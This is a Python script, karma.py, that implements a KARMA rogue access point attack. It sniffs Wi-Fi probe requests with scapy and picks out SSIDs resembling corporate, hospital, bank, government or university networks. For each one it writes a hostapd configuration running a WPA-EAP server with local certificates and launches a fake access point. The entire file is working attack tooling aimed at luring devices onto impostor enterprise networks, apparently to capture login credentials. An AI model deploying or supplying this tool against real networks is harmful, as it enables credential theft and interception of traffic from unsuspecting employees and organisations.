"""
karma.py — KARMA attack with enterprise SSID filtering.
Only responds to SSIDs matching corporate/enterprise patterns
by default. Use enterprise_filter=False to respond to everything.
"""

from scapy.all import Dot11, Dot11Elt, Dot11ProbeReq, sniff
import subprocess
import os
import re

captured_ssids = set()
skipped_ssids = set()
_active_iface = "wlan0"
_enterprise_filter = True

# ── Enterprise SSID patterns (case-insensitive) ──
ENTERPRISE_KEYWORDS = [
    "corp", "corporate", "office", "enterprise", "secure",
    "802.1x", "8021x", "eduroam", "wifi", "wlan",
    "internal", "employee", "staff", "company",
    "domain", "network", "radius", "vpn", "citrix",
    "guest", "visitor", "conference",
    ".com", ".local", ".net", ".org", ".edu",
    "univ", "campus", "school", "medical", "hospital",
    "bank", "finance", "gov",
]

# ── Consumer SSID patterns to SKIP ──
CONSUMER_BLACKLIST = [
    r"^AndroidAP",
    r"^iPhone",
    r"^iPad",
    r"^DIRECT-",
    r"^HOME-",
    r"^NETGEAR",
    r"^Linksys",
    r"^default$",
    r"^xfinitywifi$",
    r"^ATT[A-Za-z]*$",
    r"^FRITZ",
    r"^MySpectrumWiFi",
    r"^TP-LINK",
    r"^Xiaomi",
    r"^OnePlus",
    r"^Galaxy",
    r"^Redmi",
    r"^HUAWEI-",
    r"^Pixel",
]


def is_enterprise_ssid(ssid):
    """Check if an SSID looks like an enterprise network."""
    if not ssid:
        return False

    lower = ssid.lower()

    # Check blacklist first
    for pattern in CONSUMER_BLACKLIST:
        if re.match(pattern, ssid, re.IGNORECASE):
            return False

    # Check enterprise keywords
    for kw in ENTERPRISE_KEYWORDS:
        if kw in lower:
            return True

    # SSIDs with dots (domain-like) or hyphens are likely enterprise
    if "." in ssid and len(ssid) > 5:
        return True

    # SSIDs with mixed case and length > 4 might be enterprise
    if len(ssid) > 6 and any(c.isupper() for c in ssid) and any(c.islower() for c in ssid):
        return True

    return False


def karma_handler(pkt):
    global _enterprise_filter

    if pkt.haslayer(Dot11ProbeReq):
        try:
            ssid = pkt[Dot11Elt].info.decode("utf-8", errors="ignore").strip()
        except Exception:
            return

        if not ssid or ssid in captured_ssids:
            return

        # Apply enterprise filter
        if _enterprise_filter and not is_enterprise_ssid(ssid):
            if ssid not in skipped_ssids:
                skipped_ssids.add(ssid)
                print(f"[KARMA] Skip → '{ssid}' (consumer SSID) | MAC: {pkt.addr2}")
            return

        captured_ssids.add(ssid)
        print(f"[KARMA] Probe → SSID: '{ssid}' | MAC: {pkt.addr2}")
        spawn_ap_for_ssid(ssid, _active_iface)


def spawn_ap_for_ssid(ssid, iface):
    base_dir = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
    cert_dir = os.path.join(base_dir, "certs")

    conf = f"""interface={iface}
driver=nl80211
ssid={ssid}
hw_mode=g
channel=6
auth_algs=3
wpa=2
wpa_key_mgmt=WPA-EAP
rsn_pairwise=CCMP
ieee8021x=1
eap_server=1
eap_user_file=/tmp/eapx.eap_user
ca_cert={cert_dir}/ca.pem
server_cert={cert_dir}/server.pem
private_key={cert_dir}/server.key
eap_reauth_period=0
fragment_size=1400
"""
    safe = ssid.replace(" ", "_").replace("/", "").replace("\\", "")
    path = f"/tmp/karma_{safe}.conf"

    with open(path, "w") as f:
        f.write(conf)

    subprocess.Popen(
        ["hostapd", path],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL
    )
    print(f"[KARMA] AP spawned for '{ssid}'")


def start_karma(iface, enterprise_filter=True):
    global _active_iface, _enterprise_filter
    _active_iface = iface
    _enterprise_filter = enterprise_filter

    filter_status = "ON (enterprise SSIDs only)" if enterprise_filter else "OFF (all SSIDs)"
    print(f"[*] KARMA active on {iface} — listening for all probe requests...")
    print(f"[*] Enterprise filter: {filter_status}")
    print("[*] Press Ctrl+C to stop\n")

    try:
        sniff(
            iface=iface,
            prn=karma_handler,
            store=0,
            filter="type mgt subtype probe-req"
        )
    except KeyboardInterrupt:
        print(f"\n[*] KARMA stopped — spawned {len(captured_ssids)} fake AP(s)")
        if skipped_ssids:
            print(f"[*] Skipped {len(skipped_ssids)} consumer SSID(s)")
